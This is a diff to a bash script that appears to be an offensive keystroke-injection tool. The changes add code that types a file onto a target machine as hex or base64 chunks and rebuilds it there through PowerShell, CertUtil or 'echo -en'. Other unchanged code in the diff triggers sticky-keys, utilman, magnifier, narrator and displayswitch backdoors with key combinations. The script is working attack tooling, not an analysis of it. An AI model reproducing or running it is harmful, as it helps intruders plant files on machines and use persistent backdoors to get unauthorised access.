@@ -261,6 +261,8 @@ function Base64() {
     then
         data=$(basenc -w 0 --base64 "${input}")
 
+        print_status "progress" "Transferring file..."
+
         for (( i=0; i<${#data}; i+=chunks ))
         do
             if [[ ${i} -eq 0 ]]
@@ -296,14 +298,14 @@ function Bin2Hex() {
         exit 1
     fi
 
-    # TODO: For powershell.exe split the hex oneliner into chunks to decode it easily in a for loop
-
     if [[ -f "${input}" ]]
     then
     	data=$(basenc -w 0 --base16 "${input}")
 
     	if [[ "${mode}" = "powershell" ]]
     	then
+            print_status "progress" "Transferring file..."
+
 			for (( i=0; i<${#data}; i+=chunks ))
 			do
 			    if [[ ${i} -eq 0 ]]
@@ -313,6 +315,8 @@ function Bin2Hex() {
 			        Keyboard "\$${random_1} += \"${data:i:chunks}\"" "return"
 			    fi
 			done
+
+            Keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_1} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "return"
         elif [[ "${mode}" = "certutil" ]]
         then
             if [[ "${platform}" != "windows" ]]
@@ -322,6 +326,8 @@ function Bin2Hex() {
                 print_status "information" "Terminating program..."
                 exit 1
             fi
+
+            print_status "progress" "Transferring file..."
 
         	for (( i=0; i<${#data}; i+=chunks ))
 			do
@@ -336,11 +342,30 @@ function Bin2Hex() {
 			Keyboard "echo %${random_1}% > ${random_temp}.txt" "return"
 			Keyboard "CertUtil.exe -f -encodehex ${random_temp}.txt \"${output_file}\" 12" "return"
 			Keyboard "del /f ${random_temp}.txt"
-
     	elif [[ "${mode}" = "console" ]]
     	then
-    		echo "Unix bin2hex (nixhex)"
+            print_status "progress" "Transferring file..."
+
+            # Make it into a hexadecimal format to interpret the backslash
+            local temp=""
+            for (( i=0; i<${#data}; i+=2))
+            do
+                temp+="\\x${data:i:2}"
+            done
+
+            for (( i=0; i<${#temp}; i+=chunks ))
+            do
+                if [[ ${i} -eq 0 ]]
+                then
+                    Keyboard "${random_1}=\"${temp:i:chunks}\"" "return"
+                else
+                    Keyboard "${random_1}+=\"${temp:i:chunks}\"" "return"
+                fi
+            done
+
+            Keyboard "echo -en \$${random_1} > \"${output_file}\"" "return"
     	fi
+        print_status "completed" "File transferred!"
     fi
 }
 
@@ -591,7 +616,7 @@ EndOfText
     then
         print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
         Keyboard "shift shift shift shift shift" "customkey"
-        print_status "completed" "Backdoor Activated!"
+        print_status "completed" "Backdoor activated!"
     else
         print_status "error" "Invalid mode!"
     fi
@@ -619,7 +644,7 @@ EndOfText
     then
         print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
         Keyboard "Super+u" "customkey"
-        print_status "completed" "Backdoor Activated!"
+        print_status "completed" "Backdoor activated!"
     else
         print_status "error" "Invalid mode!"
     fi
@@ -648,7 +673,7 @@ EndOfText
         print_status "progress" "Activating magnifier.exe backdoor..."
         Keyboard "Super+equal" "customkey"
         Keyboard "Super+minus" "customkey"
-        print_status "completed" "Backdoor Activated!"
+        print_status "completed" "Backdoor activated!"
     else
         print_status "error" "Invalid mode!"
     fi
@@ -676,7 +701,7 @@ EndOfText
     then
         print_status "progress" "Activating narrator.exe backdoor..."
         Keyboard "Super+Return" "customkey"
-        print_status "completed" "Backdoor Activated!"
+        print_status "completed" "Backdoor activated!"
     else
         print_status "error" "Invalid mode!"
     fi
@@ -704,7 +729,7 @@ EndOfText
     then
         print_status "progress" "Activating displayswitch.exe backdoor..."
         Keyboard "Super+p" "customkey"
-        print_status "completed" "Backdoor Activated!"
+        print_status "completed" "Backdoor activated!"
     else
         print_status "error" "Invalid mode!"
     fi
